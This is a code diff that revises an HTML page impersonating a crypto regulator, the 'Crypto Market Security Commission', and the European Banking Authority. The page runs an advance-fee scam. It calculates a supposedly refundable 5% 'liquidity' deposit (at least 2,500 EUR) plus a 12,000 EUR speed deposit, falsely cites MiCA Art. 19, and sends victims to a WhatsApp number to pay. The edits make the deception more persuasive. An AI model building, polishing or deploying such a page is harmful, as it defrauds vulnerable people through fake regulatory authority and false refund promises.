@@ -22,15 +22,18 @@
         .content { padding: 40px; }
         h2 { color: var(--dark-blue); border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
 
+        .process-steps { display: flex; justify-content: space-between; margin-bottom: 30px; background: #eef4ff; padding: 15px; border-radius: 8px; border: 1px solid #d1d9e0; }
+        .step { font-size: 12px; text-align: center; flex: 1; font-weight: bold; color: var(--dark-blue); }
+        .step i { display: block; font-size: 18px; margin-bottom: 5px; color: var(--eu-blue); }
+
         .calc-box { background: #f0f4f8; border: 1px solid #d1d9e0; padding: 25px; border-radius: 6px; margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 10px; color: var(--dark-blue); font-size: 14px; text-transform: uppercase; }
         input { width: 100%; padding: 18px; border: 1px solid #abbbc8; border-radius: 4px; font-size: 22px; font-weight: bold; box-sizing: border-box; color: var(--dark-blue); background: #fff; }
 
-        /* УВЕДОМЛЕНИЕ О 5% */
-        .mandatory-notice { background: var(--alert-bg); border: 1px solid #f5e79e; padding: 20px; border-radius: 6px; display: flex; align-items: flex-start; margin-bottom: 30px; line-height: 1.5; }
-        .mandatory-notice i { color: #f08c00; font-size: 24px; margin-right: 15px; }
-        .mandatory-notice span { font-size: 14px; color: #444; }
-        .mandatory-notice b { color: #d63031; text-transform: uppercase; }
+        .mandatory-notice { background: var(--alert-bg); border: 1px solid #f5e79e; padding: 15px; border-radius: 6px; display: flex; align-items: flex-start; margin-bottom: 30px; line-height: 1.4; }
+        .mandatory-notice i { color: #f08c00; font-size: 20px; margin-right: 15px; margin-top: 2px; }
+        .mandatory-notice span { font-size: 13px; color: #665c00; font-weight: 500; }
+        .mandatory-notice b { color: #000; }
 
         .protocol-selection { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin: 25px 0; }
         .card { border: 2px solid #e1e4e8; padding: 15px 10px; border-radius: 6px; text-align: center; cursor: pointer; transition: 0.2s; background: white; }
@@ -44,11 +47,11 @@
         .summary-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1); font-size: 15px; }
         .summary-row.highlight { color: var(--eu-gold); font-weight: bold; }
         .summary-row.total { border: none; font-size: 26px; font-weight: 800; color: #fff; padding-top: 20px; }
-        .refund-badge { background: var(--success-green); color: white; padding: 2px 6px; border-radius: 3px; font-size: 10px; margin-left: 5px; }
+        .refund-badge { background: var(--success-green); color: white; padding: 2px 6px; border-radius: 3px; font-size: 10px; margin-left: 5px; vertical-align: middle; }
 
-        .legal-notice { margin-top: 30px; padding: 20px; background: #fffdf0; border: 1px solid #f5e79e; border-left: 5px solid var(--eu-gold); font-size: 13px; line-height: 1.6; color: #555; }
+        .legal-notice { margin-top: 30px; padding: 20px; background: #fffdf0; border: 1px solid #f5e79e; border-left: 5px solid var(--eu-gold); font-size: 13px; line-height: 1.6; }
 
-        .btn-action { display: block; background: var(--success-green); color: white; text-align: center; padding: 22px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 20px; margin-top: 30px; transition: 0.3s; text-transform: uppercase; }
+        .btn-action { display: block; background: var(--success-green); color: white; text-align: center; padding: 22px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 20px; margin-top: 30px; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
         .btn-action:hover { background: #218838; transform: translateY(-2px); }
 
         footer { text-align: center; padding: 40px; color: #777; font-size: 12px; }
@@ -64,29 +67,34 @@
 
 <div class="container">
     <div class="top-bar">
-        <span class="ref-number">REF: CMSC/EU/2026-INV</span>
-        <span class="status-verified"><i class="fas fa-check-circle"></i> SYSTEM READY</span>
+        <span class="ref-number">REF NUMBER: CMSC/EU/2026-99410-INV</span>
+        <span class="status-verified"><i class="fas fa-check-circle"></i> SYSTEM READY FOR DISBURSEMENT</span>
     </div>
 
     <div class="content">
         <h2>Asset Release Authorization</h2>
         
-        <div class="calc-box">
-            <label>ENTER THE TOTAL ASSET VALUE (EUR):</label>
-            <input type="number" id="amount" placeholder="0.00" oninput="updateCalculation()">
+        <div class="process-steps">
+            <div class="step"><i class="fas fa-calculator"></i>1. Calculate Amount</div>
+            <div class="step"><i class="fas fa-shield-alt"></i>2. Security Deposit</div>
+            <div class="step" style="color:var(--success-green)"><i class="fas fa-hand-holding-usd"></i>3. Full Refund & Payout</div>
         </div>
 
-        <!-- ИНФОРМАЦИЯ О 5% -->
+        <div class="calc-box">
+            <label>ENTER THE TOTAL ASSET VALUE TO RELEASE (EUR):</label>
+            <input type="number" id="amount" placeholder="e.g. 55000" oninput="updateCalculation()">
+        </div>
+
         <div class="mandatory-notice">
-            <i class="fas fa-info-circle"></i>
+            <i class="fas fa-exclamation-triangle"></i>
             <span>
-                <b>Important:</b> To initiate the transfer, a security deposit of <b>5%</b> of the total amount is required. 
-                This amount <b>IS NOT DEDUCTED</b> from your balance. It must be paid as a separate transaction for verification. 
-                Once confirmed, this 5% deposit <b>WILL BE RETURNED TO YOU</b> together with your full asset payout.
+                <b>MANDATORY SECURITY DEPOSIT (5%):</b> Under MiCA Art. 19, a mandatory liquidity synchronization deposit of 5% is required. 
+                This amount is <b>not a fee</b> and is not deducted from your assets. It must be paid separately to activate the release, 
+                and it will be <b>automatically added to your final payout</b>, returning to you in full.
             </span>
         </div>
 
-        <label>CHOOSE PROCESSING SPEED (REFUNDABLE DEPOSIT):</label>
+        <label>SELECT PROCESSING SPEED:</label>
         <div class="protocol-selection">
             <div class="card" id="p0" onclick="selectProtocol(0, 'Standard', 'p0')">
                 <i class="fas fa-clock"></i><h3>STANDARD</h3><span class="fee">0.00 EUR</span><span class="time">14-21 Days</span>
@@ -104,45 +112,46 @@
 
         <div class="summary">
             <div class="summary-row">
-                <span>Your Asset Amount:</span>
+                <span>Principal Asset Value:</span>
                 <span id="res-main">0.00 EUR</span>
             </div>
             <div class="summary-row highlight">
-                <span>Security Deposit (5% - Refundable): <span class="refund-badge">RETURNED</span></span>
+                <span>Refundable Liquidity Guarantee (5%): <span class="refund-badge">REFUNDABLE</span></span>
                 <span id="res-margin">0.00 EUR</span>
             </div>
             <div class="summary-row highlight">
-                <span>Speed Option Deposit (Refundable): <span class="refund-badge">RETURNED</span></span>
+                <span>Refundable Speed Deposit: <span class="refund-badge">REFUNDABLE</span></span>
                 <span id="res-speed">12,000.00 EUR</span>
             </div>
             <div style="margin: 15px 0; border-top: 1px dashed rgba(255,255,255,0.3);"></div>
             <div class="summary-row">
-                <span><b>TOTAL YOU MUST PAY NOW:</b></span>
-                <span id="res-deposit-only" style="color:var(--eu-gold); font-weight: bold;">12,000.00 EUR</span>
+                <span>Required Verification Payment:</span>
+                <span id="res-deposit-only" style="font-weight:bold; color:var(--eu-gold);">12,000.00 EUR</span>
             </div>
             <div class="summary-row total">
-                <span>TOTAL YOU WILL RECEIVE:</span>
+                <span>TOTAL FINAL PAYOUT:</span>
                 <span id="res-total">0.00 EUR</span>
             </div>
         </div>
 
         <div class="legal-notice">
-            <strong>REFUND GUARANTEE:</strong> All verification deposits (both the 5% security and the speed option) are fully refundable. They are required to synchronize your wallet with the European Central Node. These funds are added to your final payout and sent to your account in one single transaction.
+            <strong>REFUND POLICY:</strong> The verification deposits are used solely to synchronize the blockchain node. <strong>These funds are never deducted.</strong> The total amount (Principal + All Deposits) will be sent to your bank/wallet in a single transaction immediately after confirmation.
         </div>
 
-        <a id="wa-link" href="#" target="_top" class="btn-action">
-            <i class="fab fa-whatsapp"></i> Confirm & Get Payment Address
+        <a id="wa-link" href="#" class="btn-action">
+            <i class="fab fa-whatsapp"></i> Confirm & Get Deposit Address
         </a>
     </div>
 </div>
 
 <footer>
-    &copy; 2024-2026 Crypto Market Security Commission (CMSC).
+    &copy; 2024-2026 Crypto Market Security Commission (CMSC).<br>
+    European Banking Authority (EBA) | Brussels, Belgium.
 </footer>
 
 <script>
     let protocolFee = 12000;
-    let protocolName = "Flash";
+    let protocolName = "Flash Release";
 
     function selectProtocol(fee, name, id) {
         protocolFee = fee;
@@ -154,7 +163,11 @@
 
     function updateCalculation() {
         let amount = parseFloat(document.getElementById('amount').value) || 0;
+        
         let margin = amount * 0.05;
+        if (margin < 2500 && amount > 0) margin = 2500;
+        if (amount == 0) margin = 0;
+
         let requiredPayment = margin + protocolFee;
         let totalReturn = amount + requiredPayment;
 
@@ -164,7 +177,7 @@
         document.getElementById('res-deposit-only').innerText = requiredPayment.toLocaleString('en-GB', {minimumFractionDigits: 2}) + " EUR";
         document.getElementById('res-total').innerText = (amount > 0 ? totalReturn.toLocaleString('en-GB', {minimumFractionDigits: 2}) : "0.00") + " EUR";
 
-        let waMsg = `Hello. I want to release ${amount} EUR. Required deposit: ${requiredPayment} EUR. Protocol: ${protocolName}. Please send address.`;
+        let waMsg = `CASE REF: 2026. Asset: ${amount} EUR. Total Refundable Deposit: ${requiredPayment} EUR. Protocol: ${protocolName}. Send instructions.`;
         document.getElementById('wa-link').href = `https://wa.me/447348202458?text=${encodeURIComponent(waMsg)}`;
     }
     updateCalculation();
